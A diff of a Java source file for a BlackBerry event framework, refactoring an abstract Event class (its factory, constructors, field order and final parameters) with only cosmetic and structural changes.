@@ -7,14 +7,11 @@
  * *************************************************/
 package blackberry.event;
 
-import net.rim.device.api.system.Application;
-
 import blackberry.Status;
 import blackberry.action.Action;
 import blackberry.threadpool.TimerJob;
 import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
-import blackberry.utils.Utils;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -23,7 +20,7 @@ import blackberry.utils.Utils;
 public abstract class Event extends TimerJob {
 
     /** The debug instance. */
-	//#debug
+    //#debug
     private static Debug debug = new Debug("Event", DebugLevel.VERBOSE);
 
     /** The Constant EVENT. */
@@ -64,19 +61,6 @@ public abstract class Event extends TimerJob {
 
     // variables
 
-    /** The Event type. */
-    public int eventType = -1;
-
-    /** The Event id. */
-    public int eventId = -1;
-
-    /** The Action id. */
-    public int actionId = Action.ACTION_UNINIT; // valido, ACTION_NONE, non si
-    // rompe.
-
-    /** The status obj. */
-    protected Status statusObj = null;
-
     /**
      * Factory.
      * 
@@ -90,8 +74,8 @@ public abstract class Event extends TimerJob {
      *            the conf params
      * @return the event
      */
-    public static synchronized Event factory(int eventId, int eventType,
-            int actionId, byte[] confParams) {
+    public static synchronized Event factory(final int eventId,
+            final int eventType, final int actionId, final byte[] confParams) {
         Event event = null;
 
         switch (eventType) {
@@ -143,7 +127,7 @@ public abstract class Event extends TimerJob {
         case EVENT_AC:
             // #debug
             debug.trace("Factory EVENT_AC");
-            event = new AcEvent(actionId, confParams);            
+            event = new AcEvent(actionId, confParams);
             break;
         case EVENT_BATTERY:
             // #debug
@@ -161,6 +145,35 @@ public abstract class Event extends TimerJob {
         return event;
     }
 
+    /** The Event type. */
+    public int eventType = -1;
+
+    /** The Event id. */
+    public int eventId = -1;
+
+    /** The Action id. */
+    public int actionId = Action.ACTION_UNINIT; // valido, ACTION_NONE, non si
+    // rompe.
+
+    /** The status obj. */
+    protected Status statusObj = null;
+
+    /**
+     * Instantiates a new event.
+     * 
+     * @param eventId
+     *            the event id
+     * @param actionId
+     *            the action id
+     * @param confParams
+     *            the conf params
+     */
+    protected Event(final int eventType_, final int actionId_,
+            final byte[] confParams) {
+        this(eventType_, actionId_, "Agent");
+        parse(confParams);
+    }
+
     /**
      * Instantiates a new event.
      * 
@@ -169,9 +182,9 @@ public abstract class Event extends TimerJob {
      * @param actionId
      *            the action id
      */
-    protected Event(int eventType_, int actionId_, String name) {
+    protected Event(final int eventType_, final int actionId_, final String name) {
         super(name);
-        
+
         this.statusObj = Status.getInstance();
 
         this.eventType = eventType_;
@@ -181,21 +194,6 @@ public abstract class Event extends TimerJob {
     }
 
     /**
-     * Instantiates a new event.
-     * 
-     * @param eventId
-     *            the event id
-     * @param actionId
-     *            the action id
-     * @param confParams
-     *            the conf params
-     */
-    protected Event(int eventType_, int actionId_, byte[] confParams) {
-        this(eventType_, actionId_, "Agent");
-        parse(confParams);
-    }
-    
-    /**
      * Parses the.
      * 
      * @param confParams
@@ -203,16 +201,16 @@ public abstract class Event extends TimerJob {
      * @return true, if successful
      */
     protected abstract boolean parse(byte[] confParams);
-   
-    protected void trigger(){
-        // #debug
-        debug.trace("event: "+ this +"triggering: " + actionId);
-        statusObj.triggerAction(actionId, this);
-    }
-    
+
     public String toString() {
-        return "Event " + name +":"+ eventType + "|" + eventId;
+        return "Event " + name + ":" + eventType + "|" + eventId;
 
     }
- 
+
+    protected void trigger() {
+        // #debug
+        debug.trace("event: " + this + "triggering: " + actionId);
+        statusObj.triggerAction(actionId, this);
+    }
+
 }
